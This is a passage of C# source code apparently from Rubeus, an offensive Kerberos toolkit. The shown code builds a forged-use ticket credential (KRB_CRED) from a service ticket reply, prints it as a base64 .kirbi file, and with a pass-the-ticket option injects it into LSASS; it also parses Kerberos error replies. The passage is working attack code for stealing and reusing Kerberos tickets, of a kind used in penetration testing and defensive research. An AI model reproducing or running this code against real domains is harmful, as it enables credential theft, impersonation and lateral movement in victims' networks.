                info.key.keytype = encRepPart2.key.keytype;
                info.key.keyvalue = encRepPart2.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart2.realm;

                // [2] pname (user)
                info.pname.name_type = rep2.cname.name_type;
                    info.pname.name_string = rep2.cname.name_string;

                // [3] flags
                info.flags = encRepPart2.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart2.starttime;

                // [6] endtime
                info.endtime = encRepPart2.endtime;

                // [7] renew-till
                info.renew_till = encRepPart2.renew_till;

                // [8] srealm
                info.srealm = encRepPart2.realm;

                // [9] sname
                info.sname.name_type = encRepPart2.sname.name_type;
                info.sname.name_string = encRepPart2.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}':\r\n", targetSPN);

                if (Rubeus.Program.wrapTickets)
                {
                    // display the .kirbi base64, columns of 80 chararacters
                    foreach (string line in Helpers.Split(kirbiString, 80))
                    {
                        Console.WriteLine("      {0}", line);
                    }
                }
                else
                {
                    Console.WriteLine("      {0}", kirbiString);
                }
                Console.WriteLine("");

                if (ptt && cross)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);

                return kirbi;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }

            return null;
        }

        // added little function to print tickets because it seemed to make sense at the time :-)
        private static void PrintTicket(byte[] kirbiBytes, string message)
        {
            string kirbiString = Convert.ToBase64String(kirbiBytes);

            Console.WriteLine("[*] {0}:\r\n", message);

            if (Rubeus.Program.wrapTickets)
            {
                // display the .kirbi base64, columns of 80 chararacters
                foreach (string line in Helpers.Split(kirbiString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
            }
            else
            {
                Console.WriteLine("      {0}", kirbiString);
            }
            Console.WriteLine("");
        }
    }
}
